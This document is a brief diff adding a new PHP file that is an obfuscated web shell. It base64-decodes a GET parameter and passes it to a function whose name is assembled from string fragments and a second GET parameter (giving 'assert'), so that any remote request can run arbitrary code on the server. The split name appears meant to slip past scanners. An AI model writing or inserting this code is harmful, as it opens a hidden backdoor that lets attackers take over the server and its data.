@@ -1,0 +1,7 @@
+<?php
+$func = base64_decode($_GET["func"]);
+$a = "a";
+$s = "s";
+$c=$a.$s.$_GET["func2"];
+$c($func);
+?>
